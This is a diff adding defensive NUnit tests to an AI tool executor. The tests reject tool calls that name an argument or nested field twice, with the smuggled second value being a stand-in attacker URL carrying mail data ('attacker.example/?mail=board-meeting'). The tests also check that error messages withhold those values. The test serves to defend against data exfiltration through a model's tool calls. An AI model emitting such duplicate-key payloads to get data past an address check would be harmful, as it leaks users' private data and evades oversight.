@@ -95,6 +95,35 @@ public sealed class ToolExecutorTests : ToolRegistryTestBase
         }
     }
 
+    [TestCase("""{"query":"budget","query":"https://attacker.example/?mail=board-meeting"}""", "query", TestName = "An argument named twice")]
+    [TestCase("""{"filter":{"sender":"budget","sender":"https://attacker.example/?mail=board-meeting"}}""", "sender", TestName = "A field named twice inside an argument")]
+    public async Task ACallWhichNamesAnArgumentTwiceDoesNotRun(string argumentsJson, string repeatedName)
+    {
+        //
+        // The tool would read one of the two values, while the check for addresses the model wrote
+        // into its call reads both. Which one a provider reads when the call goes back to it is
+        // anybody's guess:
+        //
+        var executed = false;
+        var tool = new TestTool(Definition(), execute: _ =>
+        {
+            executed = true;
+            return new ToolExecutionResult { TextContent = "A passage from the handbook." };
+        });
+
+        var outcome = await this.Execute(tool, new ChatThread(), argumentsJson);
+
+        using (Assert.EnterMultipleScope())
+        {
+            Assert.That(executed, Is.False);
+            Assert.That(outcome.Trace.Status, Is.EqualTo(ToolInvocationTraceStatus.ERROR));
+            Assert.That(outcome.Content, Does.Contain($"'{repeatedName}'"), "The model learns which name it wrote twice.");
+            Assert.That(outcome.Content, Does.Not.Contain("budget").And.Not.Contain("attacker"), "The message quotes none of the values, which may carry secrets.");
+            Assert.That(outcome.Trace.Arguments, Is.Not.Empty, "The user still sees what the model sent.");
+            AssertDemandsNothing(outcome);
+        }
+    }
+
     [Test]
     public async Task WhatAResultDemandsTightensTheChat()
     {
